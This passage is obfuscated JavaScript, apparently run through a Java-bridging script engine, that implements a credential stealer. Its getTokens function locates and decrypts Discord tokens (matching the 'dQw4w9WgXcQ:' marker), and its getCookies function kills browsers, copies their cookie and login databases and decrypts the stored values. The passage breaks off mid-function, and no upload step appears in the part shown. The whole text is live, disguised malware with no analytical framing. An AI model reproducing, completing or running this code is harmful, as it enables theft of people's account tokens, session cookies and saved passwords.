_0x1896ab=_0x583504[_0x4c67b0];if(a0_0x4c67['YCbWRV']===undefined){var _0x432a8e=function(_0x17ab3d){const _0x2f5f77='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x765cc5='',_0x471c3c='';for(let _0x48d2b3=0x0,_0x5645da,_0x4e6fb4,_0x4912fe=0x0;_0x4e6fb4=_0x17ab3d['charAt'](_0x4912fe++);~_0x4e6fb4&&(_0x5645da=_0x48d2b3%0x4?_0x5645da*0x40+_0x4e6fb4:_0x4e6fb4,_0x48d2b3++%0x4)?_0x765cc5+=String['fromCharCode'](0xff&_0x5645da>>(-0x2*_0x48d2b3&0x6)):0x0){_0x4e6fb4=_0x2f5f77['indexOf'](_0x4e6fb4);}for(let _0x41ce55=0x0,_0x272ea9=_0x765cc5['length'];_0x41ce55<_0x272ea9;_0x41ce55++){_0x471c3c+='%'+('00'+_0x765cc5['charCodeAt'](_0x41ce55)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x471c3c);};const _0x1b85a0=function(_0x48ee85,_0x1290c8){let _0x4c9a15=[],_0x175d07=0x0,_0x390be2,_0x11dd29='';_0x48ee85=_0x432a8e(_0x48ee85);let _0x13feb1;for(_0x13feb1=0x0;_0x13feb1<0x100;_0x13feb1++){_0x4c9a15[_0x13feb1]=_0x13feb1;}for(_0x13feb1=0x0;_0x13feb1<0x100;_0x13feb1++){_0x175d07=(_0x175d07+_0x4c9a15[_0x13feb1]+_0x1290c8['charCodeAt'](_0x13feb1%_0x1290c8['length']))%0x100,_0x390be2=_0x4c9a15[_0x13feb1],_0x4c9a15[_0x13feb1]=_0x4c9a15[_0x175d07],_0x4c9a15[_0x175d07]=_0x390be2;}_0x13feb1=0x0,_0x175d07=0x0;for(let _0x5b9189=0x0;_0x5b9189<_0x48ee85['length'];_0x5b9189++){_0x13feb1=(_0x13feb1+0x1)%0x100,_0x175d07=(_0x175d07+_0x4c9a15[_0x13feb1])%0x100,_0x390be2=_0x4c9a15[_0x13feb1],_0x4c9a15[_0x13feb1]=_0x4c9a15[_0x175d07],_0x4c9a15[_0x175d07]=_0x390be2,_0x11dd29+=String['fromCharCode'](_0x48ee85['charCodeAt'](_0x5b9189)^_0x4c9a15[(_0x4c9a15[_0x13feb1]+_0x4c9a15[_0x175d07])%0x100]);}return _0x11dd29;};a0_0x4c67['pDobgF']=_0x1b85a0,_0x1b5800=arguments,a0_0x4c67['YCbWRV']=!![];}const _0x213688=_0x583504[0x0],_0x533a45=_0x4c67b0+_0x213688,_0x5a9542=_0x1b5800[_0x533a45];return!_0x5a9542?(a0_0x4c67['LRnPhu']===undefined&&(a0_0x4c67['LRnPhu']=!![]),_0x1896ab=a0_0x4c67['pDobgF'](_0x1896ab,_0x1176e9),_0x1b5800[_0x533a45]=_0x1896ab):_0x1896ab=_0x5a9542,_0x1896ab;},a0_0x4c67(_0x1b5800,_0x116f3a);}function getTokens(){const _0x14b462=a0_0x49b0a2;let _0x4e803d=Java[_0x14b462(0x49f,'1&mi')](_0x14b462(0x536,'ATso'));const _0x2caffa=getEnvironmentPaths();let _0x54afc7;_0x2caffa[_0x14b462(0x5df,'6(Qp')]===_0x14b462(0x349,'V$ji')?_0x54afc7=new java['io'][(_0x14b462(0x40f,'gkB6'))](_0x2caffa[_0x14b462(0x36b,'V$ji')],_0x14b462(0x3a8,'2Fbx')):_0x54afc7=new java['io'][(_0x14b462(0x3d4,'V$ji'))](_0x2caffa[_0x14b462(0x3f5,'G3bK')]+_0x14b462(0x64b,'Wi[K'));let _0x174ed6='';if(_0x54afc7[_0x14b462(0x65c,'4G]x')]()){let _0x5ebd63=_0x54afc7[_0x14b462(0x5c3,'8(V@')]();for(let _0x2f25c9=0x0;_0x2f25c9<_0x5ebd63[_0x14b462(0x5ab,'PwVi')];_0x2f25c9++){let _0x51ba5f=_0x5ebd63[_0x2f25c9];if(_0x51ba5f[_0x14b462(0x5e1,'aH$!')]()[_0x14b462(0x4ec,'rMVl')](_0x14b462(0x265,'W^I^')))try{let _0x3944dd=new java['io'][(_0x14b462(0x3e5,'a%Ty'))](_0x51ba5f),_0x18d762=new java['io'][(_0x14b462(0x252,'Wi[K'))](_0x3944dd),_0x40ee26='',_0x20beba;while((_0x20beba=_0x18d762[_0x14b462(0x311,'5w@D')]())!=null){_0x40ee26+=_0x20beba;}_0x18d762[_0x14b462(0x3bf,'zJu^')](),_0x3944dd[_0x14b462(0x565,'BYlI')]();let _0x45ad6a=/dQw4w9WgXcQ:([^"']*)/,_0x4be3ed=_0x45ad6a[_0x14b462(0x1bc,'gkB6')](_0x40ee26);if(_0x4be3ed)try{if(javax[_0x14b462(0x628,'aH$!')][_0x14b462(0x558,'h!Dk')][_0x14b462(0x393,'iy!H')](_0x14b462(0x645,'zJu^'))<0x100){let _0x59160a=java[_0x14b462(0x260,'7%NS')][_0x14b462(0x28c,'7%NS')][_0x14b462(0x35c,'6(Qp')](_0x14b462(0x2a6,'pMYq')),_0x447a6e=_0x59160a[_0x14b462(0x569,'rMVl')]();_0x447a6e[_0x14b462(0x669,'PwVi')](!![]);let _0x452f69=_0x447a6e[_0x14b462(0x527,'iy!H')](),_0x42ffd5=_0x59160a[_0x14b462(0x573,'@G#8')](_0x14b462(0x2f6,'whZ0'));_0x42ffd5[_0x14b462(0x21a,'Lz2$')](!![]),_0x42ffd5[_0x14b462(0x1ab,'W^I^')](_0x452f69,!![]);let _0xa40c68=java[_0x14b462(0x1e7,'a%Ty')][_0x14b462(0x543,'aH$!')][_0x14b462(0x246,'uenZ')](_0x14b462(0x23f,'uenZ'));_0x447a6e=_0xa40c68[_0x14b462(0x203,'V$ji')](),_0x447a6e[_0x14b462(0x2c6,'ATso')](!![]);let _0x236bf4=_0x447a6e[_0x14b462(0x4d3,')n)b')]();_0x42ffd5=_0xa40c68[_0x14b462(0x1ba,'6(Qp')](_0x14b462(0x189,'#cv9')),_0x42ffd5[_0x14b462(0x3d5,'V$ji')](!![]),_0x42ffd5[_0x14b462(0x5da,'[B%l')](_0x236bf4)[_0x14b462(0x2de,'1&mi')]('*',_0x452f69);let _0x16e998=java[_0x14b462(0x37b,'Ep[K')][_0x14b462(0x4fc,'W^I^')][_0x14b462(0x4b8,'BYlI')](_0x14b462(0x32f,'2Kmv'));_0x42ffd5=_0x16e998[_0x14b462(0x21e,'PgYc')](_0x14b462(0x38a,'2Fbx')),_0x42ffd5[_0x14b462(0x22f,'2Kmv')](!![]);let _0x353358=java[_0x14b462(0x34e,'rMVl')][_0x14b462(0x1d3,'PgYc')][_0x14b462(0x344,'Lz2$')](_0x14b462(0x2db,'Fi7!'))[_0x14b462(0x2ae,'dMvi')](_0x14b462(0x290,'whZ0'));_0x353358[_0x14b462(0x5de,'PgYc')](!![]),_0x353358[_0x14b462(0x56d,'jqTf')](_0x42ffd5,_0x42ffd5[_0x14b462(0x3f8,'zJu^')]()&~java[_0x14b462(0x467,'[B%l')][_0x14b462(0x39d,'h!Dk')][_0x14b462(0x205,'iy!H')][_0x14b462(0x330,'7%NS')]),_0x42ffd5[_0x14b462(0x4aa,'iy!H')](null,_0x236bf4);}let _0x4157be;_0x2caffa[_0x14b462(0x461,'iy!H')]===_0x14b462(0x656,'uenZ')?_0x4157be=new java['io'][(_0x14b462(0x3b4,'Prp1'))](_0x2caffa[_0x14b462(0x502,'8(V@')],_0x14b462(0x20f,'5w@D')):_0x4157be=new java['io'][(_0x14b462(0x2c9,'6(Qp'))](_0x2caffa[_0x14b462(0x5d5,'8(V@')]+_0x14b462(0x301,')WT4'));let _0x45901a=new java[(_0x14b462(0x186,'emuX'))][(_0x14b462(0x270,'6(Qp'))](java[_0x14b462(0x3eb,'@G#8')][_0x14b462(0x4c8,'6(Qp')][_0x14b462(0x39c,'RRF)')][_0x14b462(0x2f0,'h!Dk')](_0x4157be[_0x14b462(0x49a,'iy!H')]()),_0x14b462(0x437,'2Fbx')),_0x5a604e=JSON[_0x14b462(0x5a4,'Fi7!')](_0x45901a),_0x774f49=_0x5a604e[_0x14b462(0x4d2,'tldi')][_0x14b462(0x5ff,'gkB6')],_0x2e28cf=java[_0x14b462(0x354,'Prp1')][_0x14b462(0x3d0,'tldi')][_0x14b462(0x369,'dMvi')]()[_0x14b462(0x5ea,'4G]x')](_0x774f49);_0x2e28cf=_0x4e803d[_0x14b462(0x4f7,'fQM$')](_0x2e28cf,0x5,_0x2e28cf[_0x14b462(0x326,'lVXf')]);let _0x2b8483=Packages[_0x14b462(0x274,'h!Dk')][_0x14b462(0x268,'h!Dk')][_0x14b462(0x632,'1&mi')][_0x14b462(0x1bf,'jn62')][_0x14b462(0x4b6,'zJu^')][_0x14b462(0x2be,'Prp1')][_0x14b462(0x3e4,'8(V@')](_0x2e28cf),_0x2792ee=java[_0x14b462(0x507,'wIzM')][_0x14b462(0x4c0,'NO98')][_0x14b462(0x202,'BYlI')]()[_0x14b462(0x64c,'etie')](_0x4be3ed[0x1]),_0x4573ad=_0x4e803d[_0x14b462(0x318,'@[ny')](_0x2792ee,0x3,0xf),_0x52c347=_0x4e803d[_0x14b462(0x282,'#cv9')](_0x2792ee,0xf,_0x2792ee[_0x14b462(0x452,'th37')]),_0x34e3a2=javax[_0x14b462(0x5b0,'fQM$')][_0x14b462(0x36e,'aH$!')][_0x14b462(0x54b,'jn62')](_0x14b462(0x291,'dMvi')),_0xdd18d2=new javax[(_0x14b462(0x193,'lVXf'))][(_0x14b462(0x460,'2Fbx'))][(_0x14b462(0x3be,'whZ0'))](_0x2b8483,_0x14b462(0x264,'dMvi')),_0x1aaa13=new javax[(_0x14b462(0x423,'Ep[K'))][(_0x14b462(0x255,'G3bK'))][(_0x14b462(0x1fd,'Wi[K'))](0x80,_0x4573ad);_0x34e3a2[_0x14b462(0x654,'aH$!')](javax[_0x14b462(0x323,')WT4')][_0x14b462(0x493,'BYlI')][_0x14b462(0x28b,'iy!H')],_0xdd18d2,_0x1aaa13);let _0x5333a8=_0x34e3a2[_0x14b462(0x46d,'rMVl')](_0x52c347),_0x45f0d1=new java[(_0x14b462(0x3f1,'dMvi'))][(_0x14b462(0x2bf,'wIzM'))](_0x5333a8,_0x14b462(0x54a,'aH$!'));_0x174ed6[_0x14b462(0x1a4,'Fi7!')](_0x45f0d1)===-0x1&&(_0x174ed6+=_0x45f0d1+_0x14b462(0x3db,'jn62'));}catch(_0x5ca775){}}catch(_0x2dd068){}}}return _0x174ed6[_0x14b462(0x490,'Ep[K')](/\s+\|\s+$/,'');}function getCookies(){const _0x2df153=a0_0x49b0a2;killBrowsers();const _0x4f3342=getEnvironmentPaths();let _0x3b0a69={};function _0x2b61d3(){const _0x31b269=a0_0x4c67;return _0x4f3342[_0x31b269(0x5e6,'G3bK')]===_0x31b269(0x596,'jqTf')?[{'name':_0x31b269(0x3b2,'Lz2$'),'cookiePath':_0x4f3342[_0x31b269(0x197,'pMYq')]+_0x31b269(0x367,'rMVl'),'localStatePath':_0x4f3342[_0x31b269(0x206,'rMVl')]+_0x31b269(0x66c,'rMVl'),'type':_0x31b269(0x58a,'[B%l'),'loginDataPath':_0x4f3342[_0x31b269(0x1ee,'uenZ')]+_0x31b269(0x2f2,'tldi')},{'name':_0x31b269(0x29d,'pMYq'),'cookiePath':_0x4f3342[_0x31b269(0x45f,'dMvi')]+_0x31b269(0x293,'a%Ty'),'localStatePath':_0x4f3342[_0x31b269(0x566,'V$ji')]+_0x31b269(0x1b3,'whZ0'),'type':_0x31b269(0x1ec,'zEki'),'loginDataPath':_0x4f3342[_0x31b269(0x27c,'jqTf')]+_0x31b269(0x31d,'ATso')},{'name':_0x31b269(0x406,'h!Dk'),'cookiePath':_0x4f3342[_0x31b269(0x2b1,'wIzM')]+_0x31b269(0x340,'a%Ty'),'localStatePath':_0x4f3342[_0x31b269(0x50e,'Ep[K')]+_0x31b269(0x1aa,'jn62'),'type':_0x31b269(0x1f6,'Fi7!'),'loginDataPath':_0x4f3342[_0x31b269(0x2d8,'4G]x')]+_0x31b269(0x53e,'jn62')},{'name':_0x31b269(0x5ac,'Ep[K'),'cookiePath':_0x4f3342[_0x31b269(0x5ee,'5w@D')]+_0x31b269(0x2f9,'gkB6'),'localStatePath':_0x4f3342[_0x31b269(0x670,'gkB6')]+_0x31b269(0x473,'aH$!'),'type':_0x31b269(0x615,'whZ0'),'loginDataPath':_0x4f3342[_0x31b269(0x560,'Prp1')]+_0x31b269(0x471,'8(V@')}]:[{'name':_0x31b269(0x5c7,'h!Dk'),'cookiePath':_0x4f3342[_0x31b269(0x468,'dMvi')]+_0x31b269(0x33e,'zEki'),'localStatePath':_0x4f3342[_0x31b269(0x3d1,'rMVl')]+_0x31b269(0x321,'[B%l'),'type':_0x31b269(0x3da,'@G#8'),'loginDataPath':_0x4f3342[_0x31b269(0x61b,')n)b')]+_0x31b269(0x4c4,'Wi[K')},{'name':_0x31b269(0x4b0,'iy!H'),'cookiePath':_0x4f3342[_0x31b269(0x26f,'V$ji')]+_0x31b269(0x55b,'Wi[K'),'localStatePath':_0x4f3342[_0x31b269(0x201,'6(Qp')]+_0x31b269(0x30d,'BYlI'),'type':_0x31b269(0x4cc,'aH$!'),'loginDataPath':_0x4f3342[_0x31b269(0x26f,'V$ji')]+_0x31b269(0x5a0,'jqTf')},{'name':_0x31b269(0x4bd,')WT4'),'cookiePath':_0x4f3342[_0x31b269(0x310,'Ep[K')]+_0x31b269(0x32e,'pMYq'),'localStatePath':_0x4f3342[_0x31b269(0x26f,'V$ji')]+_0x31b269(0x5d1,'[B%l'),'type':_0x31b269(0x2ea,'Q%]A'),'loginDataPath':_0x4f3342[_0x31b269(0x653,'uenZ')]+_0x31b269(0x657,'th37')},{'name':_0x31b269(0x65b,'[B%l'),'cookiePath':_0x4f3342[_0x31b269(0x31c,'Lz2$')]+_0x31b269(0x192,'PwVi'),'localStatePath':_0x4f3342[_0x31b269(0x516,'4G]x')]+_0x31b269(0x22a,'RRF)'),'type':_0x31b269(0x629,'etie'),'loginDataPath':_0x4f3342[_0x31b269(0x586,'gkB6')]+_0x31b269(0x612,'RRF)')},{'name':_0x31b269(0x3d7,')WT4'),'cookiePath':_0x4f3342[_0x31b269(0x603,'tldi')]+_0x31b269(0x48e,'th37'),'type':_0x31b269(0x267,'pMYq')}];}let _0x5c6e51=_0x2b61d3();function _0x1c0dce(_0x2cf563,_0x358fae){const _0x13e8f5=a0_0x4c67;try{if(!_0x2cf563||_0x2cf563[_0x13e8f5(0x49e,'@G#8')]<0x3)return null;let _0x237558=Java[_0x13e8f5(0x2b3,'emuX')](_0x13e8f5(0x609,'uenZ')),_0x362d94;if(typeof _0x2cf563===_0x13e8f5(0x5c0,'Fi7!')){if(_0x2cf563[_0x13e8f5(0x644,')WT4')](_0x13e8f5(0x5cf,'th37'))||_0x2cf563[_0x13e8f5(0x556,'aH$!')](_0x13e8f5(0x5b8,'th37')))_0x362d94=_0x2cf563[_0x13e8f5(0x21d,'uenZ')](_0x13e8f5(0x343,'PgYc'));else try{_0x362d94=java[_0x13e8f5(0x271,'5w@D')][_0x13e8f5(0x35f,'RRF)')][_0x13e8f5(0x2fe,'[B%l')]()[_0x13e8f5(0x55d,'Prp1')](_0x2cf563);}catch(_0x547845){_0x362d94=_0x2cf563[_0x13e8f5(0x441,'jn62')](_0x13e8f5(0x60a,'@[ny'));}}else _0x362d94=_0x2cf563;if(_0x362d94[_0x13e8f5(0x1a5,'Fi7!')]<0x3)return null;let _0x54ba44=new java[(_0x13e8f5(0x3ff,'jqTf'))][(_0x13e8f5(0x403,'iy!H'))](_0x237558[_0x13e8f5(0x449,'whZ0')](_0x362d94,0x0,0x3),_0x13e8f5(0x4a3,'@[ny'));if(_0x54ba44[_0x13e8f5(0x659,'iy!H')](_0x13e8f5(0x525,'zEki'))){if(_0x362d94[_0x13e8f5(0x347,'Wi[K')]<0xf||!_0x358fae)return null;let _0x380a04=_0x237558[_0x13e8f5(0x449,'whZ0')](_0x362d94,0x3,0xf),_0x4e01f3=_0x237558[_0x13e8f5(0x4fe,'ATso')](_0x362d94,0xf,_0x362d94[_0x13e8f5(0x62c,')WT4')]-0x10),_0x3917e5=_0x237558[_0x13e8f5(0x3ce,'Lz2$')](_0x362d94,_0x362d94[_0x13e8f5(0x55c,'aH$!')]-0x10,_0x362d94[_0x13e8f5(0x45e,'gkB6')]),_0x4c4763=javax[_0x13e8f5(0x509,'whZ0')][_0x13e8f5(0x20c,'4G]x')][_0x13e8f5(0x322,'5w@D')](_0x13e8f5(0x2e6,'1&mi')),_0x1f6b49=new javax[(_0x13e8f5(0x391,'iy!H'))][(_0x13e8f5(0x3b8,'ATso'))][(_0x13e8f5(0x622,'aH$!'))](_0x358fae,_0x13e8f5(0x5aa,'G3bK')),_0x32b48c=new javax[(_0x13e8f5(0x1d8,'1&mi'))][(_0x13e8f5(0x3fa,'zJu^'))][(_0x13e8f5(0x5eb,'W^I^'))](0x80,_0x380a04);_0x4c4763[_0x13e8f5(0x5a8,'RRF)')](javax[_0x13e8f5(0x4a2,'rMVl')][_0x13e8f5(0x42a,'2Fbx')][_0x13e8f5(0x196,'Q%]A')],_0x1f6b49,_0x32b48c);let _0x49a5ed=_0x237558[_0x13e8f5(0x1f4,'Fi7!')](_0x4e01f3,_0x4e01f3[_0x13e8f5(0x631,'fQM$')]+_0x3917e5[_0x13e8f5(0x62c,')WT4')]);java[_0x13e8f5(0x295,'NO98')][_0x13e8f5(0x477,'dMvi')][_0x13e8f5(0x633,'@G#8')](_0x3917e5,0x0,_0x49a5ed,_0x4e01f3[_0x13e8f5(0x60f,'zEki')],_0x3917e5[_0x13e8f5(0x326,'lVXf')]);let _0x1dd0e5=_0x4c4763[_0x13e8f5(0x41a,'@G#8')](_0x49a5ed);return new java[(_0x13e8f5(0x572,'th37'))][(_0x13e8f5(0x1d9,'2Fbx'))](_0x1dd0e5,_0x13e8f5(0x4a3,'@[ny'));}else{if(_0x54ba44[_0x13e8f5(0x18c,'aH$!')](_0x13e8f5(0x671,'dMvi'))){if(_0x362d94[_0x13e8f5(0x642,'jn62')]<0xf||!_0x358fae)return null;let _0x167b46=_0x237558[_0x13e8f5(0x547,'rMVl')](_0x362d94,0x3,0xf),_0x306d57=_0x237558[_0x13e8f5(0x570,'dMvi')](_0x362d94,0xf,_0x362d94[_0x13e8f5(0x259,'RRF)')]);try{let _0x16c01a=javax[_0x13e8f5(0x412,'h!Dk')][_0x13e8f5(0x190,'gkB6')][_0x13e8f5(0x3e9,'iy!H')](_0x13e8f5(0x598,'tldi')),_0xb7fc95=new javax[(_0x13e8f5(0x312,'W^I^'))][(_0x13e8f5(0x625,'aH$!'))][(_0x13e8f5(0x3be,'whZ0'))](_0x358fae,_0x13e8f5(0x1f0,'Prp1')),_0x9dec37=new javax[(_0x13e8f5(0x5b1,'jn62'))][(_0x13e8f5(0x3b8,'ATso'))][(_0x13e8f5(0x2b2,'a%Ty'))](0x80,_0x167b46);_0x16c01a[_0x13e8f5(0x574,'pMYq')](javax[_0x13e8f5(0x2fb,'2Kmv')][_0x13e8f5(0x447,'6(Qp')][_0x13e8f5(0x3fb,'zEki')],_0xb7fc95,_0x9dec37);let _0x47dbdd=_0x16c01a[_0x13e8f5(0x595,'emuX')](_0x306d57);return new java[(_0x13e8f5(0x568,'wIzM'))][(_0x13e8f5(0x660,'Wi[K'))](_0x47dbdd,_0x13e8f5(0x587,'1&mi'));}catch(_0x55bf4e){return null;}}else{if(_0x362d94[0x0]==0x1&&_0x362d94[0x1]==0x0&&_0x362d94[0x2]==0x0&&_0x362d94[0x3]==0x0){let _0x5a2b44=_0x237558[_0x13e8f5(0x475,'7%NS')](_0x362d94,0x4,_0x362d94[_0x13e8f5(0x1a5,'Fi7!')]),_0x44511e=null;if(_0x44511e)return new java[(_0x13e8f5(0x240,'V$ji'))][(_0x13e8f5(0x422,'dMvi'))](_0x44511e,_0x13e8f5(0x2dd,'etie'));}return new java[(_0x13e8f5(0x3ff,'jqTf'))][(_0x13e8f5(0x403,'iy!H'))](_0x362d94,_0x13e8f5(0x58d,')n)b'));}}return null;}catch(_0x24656f){return null;}}function _0x44f47a(_0x4327e1){const _0x40e99a=a0_0x4c67;try{let _0x515bde=new java['io'][(_0x40e99a(0x62f,'8(V@'))](_0x4327e1);if(!_0x515bde[_0x40e99a(0x405,'aH$!')]())return null;let _0x9c10b6=new java[(_0x40e99a(0x4dc,'2Fbx'))][(_0x40e99a(0x188,'gkB6'))](java[_0x40e99a(0x235,'pMYq')][_0x40e99a(0x4e9,'@G#8')][_0x40e99a(0x3df,'h!Dk')][_0x40e99a(0x1b7,'fQM$')](_0x515bde[_0x40e99a(0x5ce,'Q%]A')]()),_0x40e99a(0x526,'7%NS')),_0x392926=JSON[_0x40e99a(0x5b6,'PgYc')](_0x9c10b6);if(!_0x392926[_0x40e99a(0x5f6,'zEki')]||!_0x392926[_0x40e99a(0x583,'RRF)')][_0x40e99a(0x579,'NO98')])return null;let _0x299091=Java[_0x40e99a(0x1d4,'PgYc')](_0x40e99a(0x30f,'h!Dk')),_0x419bbf=_0x392926[_0x40e99a(0x616,'th37')][_0x40e99a(0x22b,'h!Dk')],_0x352f20=java[_0x40e99a(0x236,'Lz2$')][_0x40e99a(0x427,'aH$!')][_0x40e99a(0x308,'2Fbx')]()[_0x40e99a(0x588,'RRF)')](_0x419bbf);if(_0x352f20[_0x40e99a(0x452,'th37')]<0x5)return null;_0x352f20=_0x299091[_0x40e99a(0x282,'#cv9')](_0x352f20,0x5,_0x352f20[_0x40e99a(0x478,'iy!H')]);let _0x15ec17=null;return _0x15ec17;}catch(_0x52bf02){return null;}}function _0x2cbc66(_0x5d1d36,_0x462cf9,_0x226766){const _0x555923=a0_0x4c67;try{let _0x1f5211=new java['io'][(_0x555923(0x1cf,'zJu^'))](_0x5d1d36);if(!_0x1f5211[_0x555923(0x592,'iy!H')]()||_0x1f5211[_0x555923(0x4e4,'2Fbx')]()==0x0)return[];let _0x5849bd=java[_0x555923(0x3af,'2Kmv')][_0x555923(0x477,'dMvi')][_0x555923(0x3f4,'Prp1')](_0x555923(0x4f2,')n)b')),_0x1eeadc=_0x5849bd+_0x555923(0x599,'Fi7!')+_0x462cf9+'_'+java[_0x555923(0x53b,'whZ0')][_0x555923(0x477,'dMvi')][_0x555923(0x5d4,'whZ0')]()+_0x555923(0x3c6,'7%NS');java[_0x555923(0x58b,'h!Dk')][_0x555923(0x209,')n)b')][_0x555923(0x217,'7%NS')][_0x555923(0x545,'7%NS')](_0x1f5211[_0x555923(0x5af,'gkB6')](),new java['io'][(_0x555923(0x528,'jqTf'))](_0x1eeadc)[_0x555923(0x1c4,'5w@D')](),java[_0x555923(0x2a4,'V$ji')][_0x555923(0x2bb,'NO98')][_0x555923(0x224,'zJu^')][_0x555923(0x2b0,'zEki')]);let _0x14f66e=[];try{let _0x9459ae=java[_0x555923(0x53c,'8(V@')][_0x555923(0x1f8,'Prp1')][_0x555923(0x345,'5w@D')][_0x555923(0x319,'Ep[K')](new java['io'][(_0x555923(0x27b,'BYlI'))](_0x1eeadc)[_0x555923(0x646,'1&mi')]()),_0x19e7e3=_0x1dd09c(_0x9459ae,_0x462cf9,_0x226766);try{new java['io'][(_0x555923(0x1cb,'Wi[K'))](_0x1eeadc)[_0x555923(0x43f,'wIzM')]();}catch(_0x287dcf){}return _0x19e7e3;}catch(_0x31d898){try{new java['io'][(_0x555923(0x42e,')n)b'))](_0x1eeadc)[_0x555923(0x483,'2Fbx')]();}catch(_0x1cf972){}return[{'domain':_0x555923(0x25e,'Ep[K'),'name':_0x555923(0x47a,'emuX'),'value':_0x31d898[_0x555923(0x551,'Q%]A')](),'path':'/','expires':0x0,'httpOnly':![],'secure':![],'sameSite':_0x555923(0x426,'#cv9'),'browser':_0x462cf9,'encrypted':![]}];}}catch(_0x13e10d){return[{'domain':_0x555923(0x54f,'Ep[K'),'name':_0x555923(0x4de,'lVXf'),'value':_0x13e10d[_0x555923(0x3f0,'1&mi')](),'path':'/','expires':0x0,'httpOnly':![],'secure':![],'sameSite':_0x555923(0x462,'Prp1'),'browser':_0x462cf9,'encrypted':![]}];}}function _0x1dd09c(_0x3f3912,_0xc90a07,_0x2f63c8){const _0x3c2d4a=a0_0x4c67;let _0x1a5f38=[];try{let _0x34c577=new java[(_0x3c2d4a(0x2e8,')WT4'))][(_0x3c2d4a(0x413,'@[ny'))](java[_0x3c2d4a(0x43e,'Wi[K')][_0x3c2d4a(0x377,'etie')][_0x3c2d4a(0x591,'NO98')](_0x3f3912,0x0,0x10),_0x3c2d4a(0x5f2,'W^I^'));if(!_0x34c577[_0x3c2d4a(0x1f2,'lVXf')](_0x3c2d4a(0x28f,'Fi7!')))throw new Error(_0x3c2d4a(0x1c7,')n)b'));let _0x254950=(_0x3f3912[0x10]&0xff)<<0x8|_0x3f3912[0x11]&0xff;if(_0x254950==0x1)_0x254950=0x10000;let _0x340172=(_0x3f3912[0x18]&0xff)<<0x18|(_0x3f3912[0x19]&0xff)<<0x10|(_0x3f3912[0x1a]&0xff)<<0x8|_0x3f3912[0x1b]&0xff,_0x459583=(_0x3f3912[0x1c]&0xff)<<0x18|(_0x3f3912[0x1d]&0xff)<<0x10|(_0x3f3912[0x1e]&0xff)<<0x8|_0x3f3912[0x1f]&0xff,_0x273f39=[function(){return _0x35d8f9(_0x3f3912,_0xc90a07,_0x2f63c8);},function(){return _0x423c64(_0x3f3912,_0xc90a07);},function(){return _0x35f9b8(_0x3f3912,_0xc90a07,_0x2f63c8);}];for(let _0x38be10=0x0;_0x38be10<_0x273f39[_0x3c2d4a(0x478,'iy!H')];_0x38be10++){try{let _0x390e1f=_0x273f39[_0x38be10]();if(_0x390e1f&&_0x390e1f[_0x3c2d4a(0x49e,'@G#8')]>0x0){_0x1a5f38=_0x1a5f38[_0x3c2d4a(0x51d,'uenZ')](_0x390e1f);if(_0x1a5f38[_0x3c2d4a(0x1be,'W^I^')]>=0x64)break;}}catch(_0x177ae8){continue;}}return _0x1a5f38;}catch(_0x22964d){return[{'domain':_0x3c2d4a(0x3a2,'iy!H'),'name':_0x3c2d4a(0x57c,'fQM$'),'value':_0x22964d[_0x3c2d4a(0x3b9,'zJu^')](),'path':'/','expires':0x0,'httpOnly':![],'secure':![],'sameSite':_0x3c2d4a(0x534,'rMVl'),'browser':_0xc90a07,'encrypted':![]}];}}function _0x35d8f9(_0xba1108,_0x1be1c6,_0x34ecdb){const _0x2d11e5=a0_0x4c67;let _0x231936=[];try{let _0x1e9d28=new java[(_0x2d11e5(0x336,'@G#8'))][(_0x2d11e5(0x5ad,'tldi'))](_0xba1108,_0x2d11e5(0x32c,'tldi')),_0x40c685=[/\.([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.%]{1,100})\x00+(v1[01][\x00-\xFF]{10,1000})\x00/g,/\.([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.%]{1,100})\x00+([\x00-\xFF]{10,2000})\x00+(\/[^\x00]{0,200}|\/)\x00/g,/([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.%]{1,100})\x00+([\x00-\xFF]{10,1000})\x00/g,/([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.%]{1,50})\x00+([a-zA-Z0-9\+\/\=\-_\.%:;,\s]{5,500})\x00/g];for(let _0x3cde76=0x0;_0x3cde76<_0x40c685[_0x2d11e5(0x39f,'7%NS')]&&_0x231936[_0x2d11e5(0x36c,'Q%]A')]<0x64;_0x3cde76++){let _0x4ac608=_0x40c685[_0x3cde76],_0x5ebf70;while((_0x5ebf70=_0x4ac608[_0x2d11e5(0x495,'PwVi')](_0x1e9d28))!==null&&_0x231936[_0x2d11e5(0x37a,'tldi')]<0x64){let _0x10e2a8=_0x5ebf70[0x1],_0x4a161a=_0x5ebf70[0x2],_0x402dd1=_0x5ebf70[0x3],_0x48ce86=_0x5ebf70[0x4]||'/';if(!_0x10e2a8||!_0x4a161a||!_0x402dd1)continue;if(_0x10e2a8[_0x2d11e5(0x347,'Wi[K')]>0x64||_0x4a161a[_0x2d11e5(0x4d5,'1&mi')]>0x64||_0x402dd1[_0x2d11e5(0x397,'pMYq')]>0xfa0)continue;if(!/^[a-zA-Z0-9\-]+\.[a-zA-Z]{2,10}$/[_0x2d11e5(0x41e,'4G]x')](_0x10e2a8))continue;if(!/^[a-zA-Z0-9_\-\.%]+$/[_0x2d11e5(0x2c4,'uenZ')](_0x4a161a))continue;if(_0x402dd1[_0x2d11e5(0x20d,'a%Ty')](_0x2d11e5(0x4ab,'[B%l'))||_0x402dd1[_0x2d11e5(0x425,'#cv9')]<0x3)continue;!_0x10e2a8[_0x2d11e5(0x42b,'Fi7!')]('.')&&(_0x10e2a8='.'+_0x10e2a8);if(!_0x48ce86||_0x48ce86==='')_0x48ce86='/';if(!_0x48ce86[_0x2d11e5(0x470,'G3bK')]('/'))_0x48ce86='/'+_0x48ce86;let _0x5e018b=_0x402dd1,_0x3b82c5=![];if(_0x34ecdb&&(_0x402dd1[_0x2d11e5(0x33f,'PwVi')](_0x2d11e5(0x1c0,'tldi'))||_0x402dd1[_0x2d11e5(0x3ef,'@[ny')](_0x2d11e5(0x337,'jn62'))))try{let 